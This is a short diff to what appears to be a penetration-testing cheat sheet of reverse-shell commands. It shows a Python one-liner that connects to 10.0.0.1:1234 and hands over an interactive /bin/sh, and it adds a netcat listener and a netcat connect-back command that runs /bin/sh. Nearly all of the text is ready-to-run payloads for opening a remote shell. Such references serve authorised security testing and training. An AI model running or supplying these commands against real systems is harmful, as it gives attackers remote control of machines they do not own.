@@ -34,6 +34,9 @@
 # Reverse Shells
 	1. Python shell
 		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+	2. netcat
+		nc -lvp 443
+		nc -nv <IP Address> 443 -e /bin/sh
 
 # Reverse Shells using metasploit
 
